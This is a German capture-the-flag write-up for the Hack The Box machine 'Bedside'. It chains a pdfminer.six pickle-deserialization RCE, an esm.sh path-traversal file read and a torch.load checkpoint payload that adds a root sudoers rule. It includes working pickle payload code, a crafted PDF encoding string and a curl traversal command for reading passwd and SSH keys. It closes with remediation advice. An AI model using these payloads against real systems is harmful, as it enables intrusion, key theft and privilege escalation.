# Hack The Box: Bedside Writeup

> Flags sind absichtlich nicht enthalten.

## Überblick

**Bedside** ist eine Linux-Maschine rund um ein medizinisches „Research-Portal", das
hochgeladene Dateien für ein „AI-Training" verarbeitet. Die Kette verbindet drei
Deserialisierungs-/Parser-Schwachstellen über eine Container-/Host-Grenze hinweg:

1. **Foothold:** `pdfminer.six` CMap-Pickle-RCE (CVE-2025-64512) über das Upload-Portal → Shell im `data-wrangler`-Container.
2. **Pivot zum Host:** `esm.sh` Local File Inclusion (CVE-2025-59341) auf einem host-internen Dienst → SSH-Key des Users `developer`.
3. **Privesc:** unsichere `torch.load()`-Deserialisierung eines root-ausgeführten MONAI-Trainers → Root.

| Port | Dienst |
|------|--------|
| 22   | OpenSSH 10.0p2 (Debian) |
| 80   | Apache 2.4.68 (Debian) |

Nur intern (host-networking, `127.0.0.1`): Port 3000 (esm.sh „Image Viewer").

---

## Recon

Portscan zeigt nur 22 und 80. Port 80 leitet auf `bedside.htb` um → Eintrag in `/etc/hosts`.

Vhost-Fuzzing fördert einen zweiten Namen zu Tage (alle anderen Namen liefern eine
identische 301-Weiterleitung, der echte Vhost antwortet mit 200):

```bash
gobuster vhost -u http://10.129.x.x --domain bedside.htb --append-domain \
  -w subdomains-top1million-5000.txt
# -> research.bedside.htb  (Status: 200)
```

`research.bedside.htb` ist ein Upload-Portal: erlaubte Endungen
`jpeg, jpg, png, bmp, tiff, dcm, pdf, gz, zip`. Uploads landen web-lesbar unter
`/var/www/research.bedside.htb/uploads/`. Es gibt zwei serverseitige Prüfungen
(Endungs-Whitelist **und** echte MIME-Prüfung), der Dateiname wird per `basename()`
+ Sanitisierung (Sonderzeichen → `_`) entschärft. `.php` ist im Uploads-Ordner
per Apache-Regel gesperrt (403). Command-Injection über den Dateinamen und
Doppel-Endungs-Tricks scheitern damit.

Entscheidender Hinweis im Upload-Response-Header:

```
X-Powered-By: pdfminer.six
```

Das ist ein bewusster Wink auf die PDF-Verarbeitungs-Bibliothek.

---

## Foothold — CVE-2025-64512 (pdfminer.six CMap Pickle RCE)

`pdfminer.six < 20251107` lädt CMap-Daten über `CMapDB._load_data(name)`:

```python
filename = "%s.pickle.gz" % name
path = os.path.join(directory, filename)      # absoluter name -> directory wird ignoriert
return type(str(name), (), pickle.loads(gzfile.read()))
```

Der CMap-`name` stammt aus dem `/Encoding`-Feld einer PDF-Schrift und ist per
Path-Traversal/absolutem Pfad steuerbar → `pickle.loads()` auf eine vom Angreifer
kontrollierte Datei = RCE. Da das Portal **`gz`** erlaubt und den Upload-Pfad kennt,
lässt sich beides einschleusen.

**Schritt 1 — Payload-Pickle als `evil.pickle.gz` hochladen**

```python
import os, gzip, pickle
class E:
    def __reduce__(self):
        return (os.system, ("<reverse shell / command>",))
open("evil.pickle.gz","wb").write(gzip.compress(pickle.dumps(E())))
```

Endung `gz` + MIME `application/gzip` passieren die Prüfung; die Datei landet als
`/var/www/research.bedside.htb/uploads/evil.pickle.gz`.

**Schritt 2 — Trigger-PDF hochladen**

PDF mit einer Type0-Schrift, deren `/Encoding` der absolute Pfad zum Pickle **ohne**
`.pickle.gz`-Suffix ist (Slashes als `#2F` kodiert):

```
/Encoding /#2Fvar#2Fwww#2Fresearch.bedside.htb#2Fuploads#2Fevil
```

Lokal validierbar: `pdfminer.high_level.extract_text()` ruft `_load_data` mit exakt
`/var/www/research.bedside.htb/uploads/evil` auf.

Ein Backend-Worker (`/app/pdf_watcher.py`) läuft alle 30 s `pdf2txt.py` über die
Uploads → `extract_text` → `pickle.loads` → **Code-Exec als `datawrangler`** in einem
Docker-Container.

---

## Enumeration (Container → Host)

Im Container:

- Unprivilegiert (`CapEff=0`), kein Docker-Socket, kein Raw-Device.
- Bind-Mounts vom Host: `/var/www/research.bedside.htb/uploads` und `/datastore`.
- `network_mode: host` (der Container sieht die Host-IP via `hostname -I`).

Wegen host-networking ist `127.0.0.1` = Host-Loopback. Ein voller Localhost-Scan
zeigt einen extern **nicht** sichtbaren Dienst:

```
OPEN 127.0.0.1: [22, 80, 3000]
```

Port 3000 = „Bedside Clinic – Image Viewer", eine React-App auf einem **esm.sh/x**
Dev-Server (Hinweise: `/@hmr`, „Built with esm.sh/x"), laufend als User `developer`.

---

## Pivot zum Host — CVE-2025-59341 (esm.sh LFI)

`esm.sh ≤ v136` erlaubt Local File Inclusion über eine Legacy-Route mit
Path-Traversal (wichtig: `--path-as-is`, damit `../` nicht normalisiert wird):

```bash
curl --path-as-is \
  'http://127.0.0.1:3000/pr/x/y@99/../../../../../../../../../../etc/passwd?raw=1&module=1'
```

`/etc/passwd` verrät den User `developer` (uid 1000). Der Dienst läuft als `developer`
und kann dessen Dateien lesen:

- `home/developer/user.txt` → **User-Flag**
- `home/developer/.ssh/id_ed25519` → privater SSH-Key

Mit dem Key: direkter, stabiler SSH-Login als `developer` auf dem Host.

---

## Privilege Escalation — unsichere `torch.load()`-Deserialisierung

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

`/opt/trainer/bedside_trainer.py` (läuft als root) lädt das neueste `*.pt` aus
`/datastore/checkpoints` mit MONAI `CheckpointLoader`:

```python
checkpoint = torch.load(self.load_path, map_location=self.map_location, weights_only=False)
```

`weights_only=False` (MONAI 1.5.0) + torch 2.5.0 → `torch.load` deserialisiert
beliebiges Pickle = RCE. `/datastore` gehört `datawrangler:dataops`, `developer` kann
dort **nicht** schreiben — also werden Checkpoint und ein gültiges Trainingsbild aus
dem `datawrangler`-Container platziert:

- gültiges PNG nach `/datastore/processed/` (damit der DataLoader/`build_model` durchläuft),
- bösartiges Pickle-`.pt` nach `/datastore/checkpoints/`.

Payload-Pickle (torch.load nimmt den Legacy-Pickle-Pfad; `__reduce__` feuert beim
Deserialisieren, noch bevor torch die Magic-Number prüft):

```python
import pickle, os
class E:
    def __reduce__(self):
        return (os.system, ("echo 'developer ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/00_pwn",))
open("evil.pt","wb").write(pickle.dumps(E()))
```

Wichtig: Die sudoers-Regel erlaubt den Befehl **exakt ohne Zusatzargumente** — der
Trainer muss als `sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py` (ohne Flags)
gestartet werden, sonst greift NOPASSWD nicht.

```bash
sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py   # -> os.system als root
sudo -n id                                              # uid=0(root)
```

→ **Root**. (Ebenso denkbar: SUID-Bash — scheitert hier aber, da `/tmp` `nosuid` ist;
daher der sudoers-Weg.)

---

## Kill Chain

```
Vhost research.bedside.htb (Upload-Portal, Hinweis X-Powered-By: pdfminer.six)
        |  CVE-2025-64512: evil.pickle.gz + PDF /Encoding-Traversal
        v
RCE als datawrangler  (Docker-Container, network_mode: host)
        |  Localhost-Scan -> 127.0.0.1:3000 esm.sh Image Viewer (laeuft als developer)
        |  CVE-2025-59341: esm.sh LFI (--path-as-is /pr/x/y@99/../../etc/passwd?raw=1&module=1)
        v
User-Flag + developer SSH-Key  ->  SSH als developer
        |  sudo NOPASSWD: /opt/trainer/bedside_trainer.py (torch.load weights_only=False)
        |  boesartiges .pt in /datastore/checkpoints (schreibbar als datawrangler)
        v
Root
```

## Takeaways

- **Header als Recon-Gold:** `X-Powered-By: pdfminer.six` legte die gesamte Pipeline offen.
- **Ein lesender Konverter hinterlässt keine Spuren:** kein geänderter/gelöschter Upload — die Verarbeitung war erst am Response-Header und am periodischen Worker erkennbar.
- **`network_mode: host`** macht „nur intern" erreichbare Dienste (Port 3000) vom kompromittierten Container aus angreifbar.
- **Deserialisierung überall:** pickle (pdfminer), LFI (esm.sh), pickle (torch.load) — drei Glieder derselben Klasse.
- **Geteilte, schreibbare Bind-Mounts** (`/datastore`) überbrücken die Container-/Host-Vertrauensgrenze für den Root-Schritt.

## Empfehlungen

- pdfminer.six ≥ 20251107; MONAI/torch mit `weights_only=True` bzw. keine untrusted Checkpoints; esm.sh aktualisieren.
- Upload-Verarbeitung ohne Deserialisierung untrusted Inhalte; Worker in isoliertem Container ohne `network_mode: host`.
- `sudo`-Regeln auf konkrete, argument-gebundene Befehle beschränken; keine root-Prozesse, die von low-priv-schreibbaren Pfaden (`/datastore`) laden.
- Interne Dienste nicht an alle Interfaces binden; Least-Privilege für Bind-Mounts.
